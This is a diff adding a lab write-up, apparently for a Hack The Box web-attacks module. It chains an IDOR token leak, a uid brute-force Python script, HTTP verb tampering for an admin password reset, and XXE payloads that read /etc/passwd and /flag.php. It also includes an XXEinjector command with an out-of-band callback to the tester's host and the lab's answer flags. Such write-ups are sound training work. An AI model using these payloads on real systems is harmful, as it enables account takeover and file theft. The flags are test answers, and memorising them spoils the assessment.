@@ -14,6 +14,7 @@
     1. [Local File Disclosure](#local-file-disclosure)
     2. [Advanced File Disclosure](#advanced-file-disclosure)
     3. [Blind Data Exfiltration](#blind-data-exfiltration)
+4. [Skills Assessment](#skills-assessment)
 
 ## Tools/Useful Links
 1. Burpsuite
@@ -213,6 +214,155 @@
     Once we save the request, we can use XXEinjector tool.
 
     ```bash
-    xxeinjector --host=10.10.14.101 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+    xxeinjector --host=10.10.14.101 --httpport=8000 --file=/tmp/xxe.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter
     ```
     We can find the result in the Log folder. The answer is `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`.
+
+
+## Skills Assessment
+1. Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.
+
+    After doing some exploration, i discover some informations in the different endpoints.
+
+    1. **/profile.php** endpoint
+    
+        Here the request and response in this endpoint looks like:
+
+        ![alt text](<Assets/Skills Assessment - 1.png>)
+
+        We can see that we can get the user full name and the company by changing the uid in the request.
+    
+    2. **/api.php/token/<id>** endpoint
+
+        Here the request and response in this endpoint looks like:
+
+        ![alt text](<Assets/Skills Assessment - 2.png>)
+
+        We can get the token of the other user by change the id to the apopriate user id. This is **IDOR** vuln. An Insecure Direct Object Reference (IDOR) occurs when an application exposes a reference to an internal object (like a file, database record, or user account) and fails to verify that the user requesting it is actually authorized to access it.
+    
+    3. **/reset.php** endpoint
+
+        Here the request and response in this endpoint looks like:
+
+        ![alt text](<Assets/Skills Assessment - 3.png>)
+
+        We need **token** and **uid** to reset the user password. We can get both of this by using previous endpoint.
+
+    Based on the information, here the steps to exploit:
+
+    1. Bruteforce the **uid** to find the admin uid
+
+        We can use this script to find it.
+
+        ```python
+        import requests
+        import json
+
+        # Target Configuration
+        TARGET_URL = "http://94.237.63.176:32089"
+        START_UID = 1
+        END_UID = 100  
+
+        headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
+        }
+
+        # Session cookies (Use your current valid session)
+        cookies = {
+            "PHPSESSID": "0aqqq0b5hek2lihb75o432prab", # Replace with your active session ID if it expires
+            "uid": "74" 
+        }
+
+        def find_admin():
+            print(f"[*] Starting brute-force on {TARGET_URL}/api.php/user/")
+            
+            for uid in range(START_UID, END_UID + 1):
+                try:
+                    # Request the user profile API endpoint
+                    response = requests.get(f"{TARGET_URL}/api.php/user/{uid}", headers=headers, cookies=cookies)
+                    
+                    # Check if the request was successful
+                    if response.status_code == 200:
+                        try:
+                            data = response.json()
+                            name = data.get("full_name", "Unknown")
+                            company = data.get("company", "Unknown")
+                            
+                            print(f"[+] UID {uid}: {name} ({company})")
+                            
+                            full_data = (name + company).lower()
+
+                            if "admin" in full_data or "administrator" in full_data:
+                                print(f"\n[!!!] ADMIN FOUND: UID {uid} [!!!]")
+                                print(f"Details: {json.dumps(data, indent=2)}\n")
+                                return uid
+                                
+                        except json.JSONDecodeError:
+                            pass
+                    else:
+                        pass
+
+                except Exception as e:
+                    print(f"[!] Error on UID {uid}: {e}")
+
+            print("[*] Scan complete.")
+            return None
+
+        if __name__ == "__main__":
+            find_admin()
+        ```
+        ![alt text](<Assets/Skills Assessment - 4.png>)
+
+        We can see that the uid of the admin is **52**.
+
+    2. Steal the **token** of the admin
+
+        We can use **/api.php/token/52** endpoint to get the token.
+
+        ![alt text](<Assets/Skills Assessment - 5.png>)
+
+        ```txt
+        e51a85fa-17ac-11ec-8e51-e78234eb7b0c
+        ```
+    
+    3. **Reset** admin password
+
+        Once we have the uid and the token of the admin, we can use **/reset.php** to reset the admin password. But something wrong, we get **Denined Access** when we tried to change the password even we have the valid uid and token. After doing some exploration, we need to change the method by clicking **change request method** to **GET**. This mean, it has **HTTP Verb Tampering** vuln.
+
+        ![alt text](<Assets/Skills Assessment - 6.png>)
+
+        Then, we can relogin by admin credential. We will get new endpoint, **/addEvent.php**. It send XML request and display the value of **<name>** tag. It has high probabilty of **XXE** vuln.
+
+        ![alt text](<Assets/Skills Assessment - 7.png>)
+
+    4. Exploit **/addEvent.php** endpoint by using **XXE**
+
+        I tried to test it by using basic payload of XXE.
+
+        ```xml
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+        <root>
+        <name>&xxe;</name>
+        <details>def</details>
+        <date>2026-01-05</date>
+        </root>
+        ```
+        ![alt text](<Assets/Skills Assessment - 8.png>)
+
+        We can see the payload is working. We can use this payload to read the flag:
+
+        ```xml
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=///flag.php">
+        ]>
+        <root>
+        <name>&xxe;</name>
+        <details>def</details>
+        <date>2026-01-05</date>
+        </root>
+        ```
+        The answer is `HTB{m4573r_w3b_4774ck3r}`.
